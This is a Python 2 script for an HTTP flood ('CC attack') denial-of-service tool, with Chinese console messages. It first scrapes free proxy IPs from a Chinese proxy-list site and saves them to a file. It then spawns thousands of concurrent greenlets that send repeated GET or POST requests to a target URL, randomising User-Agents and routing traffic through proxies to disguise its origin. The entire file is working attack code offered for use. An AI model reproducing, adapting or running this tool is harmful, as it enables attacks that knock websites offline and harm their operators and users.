#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import urlparse
import traceback
from gevent import pool, queue, spawn, joinall

import cookielib, optparse, random, re, string, urllib2, urlparse

from gevent.monkey import patch_all
patch_all()


PROXY_LIST_DOMAIN = "http://www.youdaili.cn/Daili/guonei/"
GET, POST            = "GET", "POST"                            # enumerator-like values used for marking current phase
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"         # optional HTTP header names
PROXY_FILE_NAME = "proxy.txt"

USER_AGENTS = (                                                 # items used for picking random HTTP User-Agent header value
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.2) Gecko/20020508 Netscape6/6.1",
    "Mozilla/5.0 (X11;U; Linux i686; en-GB; rv:1.9.1) Gecko/20090624 Ubuntu/9.04 (jaunty) Firefox/3.5",
    "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10"
)

_headers = {}                                                   # used for storing dictionary with optional header values

_proxylist = []

NEW_LINK = re.compile(r'"newslist_body".*?<a href="(.*?)"',re.S)
IP_PROXY = re.compile(r'(\d[\d.]+?):(.+?)@HTTP')
NEXT_PAFE = re.compile(r"<a href='([^a]+?)'>下一页</a>")
def getProxyList():
    try:
        c = urllib2.urlopen(PROXY_LIST_DOMAIN).read()
    except Exception:
        print "获取代理链接：%s 不可达" % PROXY_LIST_DOMAIN
    match = NEW_LINK.search(c)
    if not match:
        print "获取国内代理IP列表有误"
        return
    start_url = match.group(1)
    print "国内代理抓取起始链接：%s" % start_url
    urls = [start_url]
    for url in urls:
        print '代理链接 :',url
        try:
            c = urllib2.urlopen(url).read()
            for match in IP_PROXY.findall(c):
                _proxylist.append((match[0], match[1]))
            match = NEXT_PAFE.search(c)
            if match:
                u = urlparse.urljoin(url,match.group(1))
                if u not in urls:
                    urls.append(u)
        except Exception:
            pass

    with open(PROXY_FILE_NAME, 'w') as f:
        for ip, port in _proxylist:
            f.write("%s:%s\n" % (ip, port))
        print "代理写入文件：%s 成功" % PROXY_FILE_NAME


class CC(object):
    def __init__(self, options):
        self.options = options
        self.url = options.url
        self.pool = pool.Pool(int(options.count) if options.count else 50)
        self.is_proxy = options.proxy

    def start(self):
        if self.is_proxy:
            getProxyList()
            if not _proxylist:
                print "代理IP不可用"
                return

        print "****START****"
        try:
            for x in xrange(10000):
                self.pool.spawn(self.attack)
        except KeyboardInterrupt:
            print "CC Attack Abort"
        except Exception,e:
            print str(e)
            print traceback.format_exc()
        finally:
            print "****END****"
        
    def attack(self):
        if not options.ua:
            ua = random.choice(USER_AGENTS)
        h = dict(filter(lambda item: item[1], [(COOKIE, options.cookie), (UA, ua), (REFERER, options.referer)]))
        req = urllib2.Request(self.url, data= options.data, headers=h)
        if self.is_proxy:
            proxy = "%s:%s" % random.choice(_proxylist)
            opener = urllib2.build_opener(urllib2.ProxyHandler({'http': proxy}))
        else:
            opener = urllib2.build_opener()
        for x in xrange(100):
            try:
                if self.is_proxy:
                    print 'attack:%s,proxy:%s' % (self.url, proxy)
                else:
                    print 'attack:%s' % (self.url)
                print 'content:%s' % opener.open(req).read()[:10]
            except Exception,e:
                print str(e)
                break


def main(options):
    cc = CC(options)
    cc.start()


if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_option("-c", "--count",dest="count", help="Thread count")
    parser.add_option("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("--random-agent", dest="randomAgent", action="store_true", help="Use randomly selected HTTP User-Agent header value")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("--proxy", dest="proxy", action="store_true", help="Use proxy or not")
    
    options, _ = parser.parse_args()
    if options.url:
        main(options)
    else:
        parser.print_help()

